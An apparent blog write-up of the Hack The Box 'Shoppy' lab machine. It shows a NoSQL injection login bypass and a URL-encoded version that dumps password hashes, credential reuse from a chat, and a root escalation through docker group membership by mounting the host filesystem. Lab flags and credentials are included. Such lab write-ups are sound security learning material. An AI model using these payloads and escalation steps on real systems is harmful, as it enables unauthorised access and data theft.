---
title: "Shoppy from HTB"
categories: [Hack The Box]
tags: [Hack The Box]
---
# Shoppy from HTB
add this to `/etc/hosts`
```
10.10.11.180 shoppy.htb
```
Access the site and we see that there is nothing.
Run `gobuster`for directory busting and `ffuf`for subdomains. `for fuf use /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt`
Before that finishes find out on what `language`does site operate on.
Try to get `404`code and with that we can learn sum.
```
Cannot GET /help
```
`Cannot GET` searching that tells us that site runs on `Node-JS`
With `gobuster` we found `login`page. Go to that and then perform `nosql-injection`
```
admin'||'1'=='1 <---- in username
e.g. help <---- in password
```
Then `login`
Click `search for users`and then perform same injection but now in `url`. It has to be `url-encoded`.
`url-encoded`
```
http://shoppy.htb/admin/search-users?username=admin%27%7C%7C%271%27%3D%3D%271
```
Then you will get this.
```
[
  {
    "_id": "62db0e93d6d6a999a66ee67a",
    "username": "admin",
    "password": "23c6877d9e2b564ef8b32c3a23de27b2"
  },
  {
    "_id": "62db0e93d6d6a999a66ee67b",
    "username": "josh",
    "password": "6ebcea65320589ca4f2f1ce039975995"
  }
]
```
Go to `cracstation`and paste both password. You will get password for `josh`and it's : `remembermethisway`. You can't access `ssh`with this.
So then maybe there is an `subdomain`.
`ffuf`found `mattermost`subdomain so add it to `/etc/hosts`
```
10.10.11.180 mattermost.shoppy.htb
```
Then access it.
In `Deploy Machine`chat you will find this:
```
Hey @josh,

For the deploy machine,
you can create an account with these creds
 username: jaeger
 password: Sh0ppyBest@pp!
```
Go to `ssh`and log in with this `creds`.
***
User Flag is: c6acc5b48213051b19adc3ae540c7240
***
```bash
$ sudo -l
[sudo] password for jaeger:
Matching Defaults entries for jaeger on shoppy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jaeger may run the following commands on shoppy:
    (deploy) /home/deploy/password-manager
```
You'll need password for this `password-manager`you will find it with this:
```bash
strings -e l /home/deploy/password-manager
Sample
```
Then run it. You will get password for `deploy`. Become the `deploy`user.
```bash
id
uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)
```
We are in `docker`group. With this you can always become the `root`
```bash
deploy@shoppy:~$ docker ps
CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES
docker images
REPOSITORY   TAG       IMAGE ID       CREATED       SIZE
alpine       latest    d7d3d98c851f   2 years ago   5.53MB
deploy@shoppy:~$ docker run --rm -it -v /:/mnt alpine /bin/sh
/ # cd mnt
/mnt # chroot .
```
The command `docker run --rm -it -v /:/mnt alpine /bin/sh` is used to run a Docker container with the following options:

- **`docker run`**: This command is used to start a new Docker container.
- **`--rm`**: Automatically removes the container when it exits. This prevents unused containers from accumulating on your system.
- **`-it`**: Combines `-i` (interactive) and `-t` (pseudo-`TTY`), allowing you to interact with the container via the terminal.
- **`-v /:/mnt`**: This mounts the host machine's root directory (`/`) to the container's `/mnt` directory. Essentially, the container will have access to the entire file system of the host under the `/mnt` directory.
- **`alpine`**: This specifies the Docker image to use, in this case, `alpine`, which is a small, `minimalistic` Linux distribution.
- **`/bin/sh`**: This is the command to be run inside the container, starting a shell session (`/bin/sh`) in the Alpine container.

### **What This Command Does:**

1. It starts an Alpine Linux container.
2. It provides you with an interactive shell inside the container.
3. It gives the container access to the host machine's entire file system, mounted at `/mnt`.

### **Potential Risks:**

This command gives the container unrestricted access to your entire host file system, which can be dangerous if not handled with care, as it could potentially modify or delete critical files on the host system.
***
Root Flag is: 063a18189ade4a31fbf52b970fab80a1
***
![](/assets/images/Screenshot from 2024-08-14 18-07-58.png)
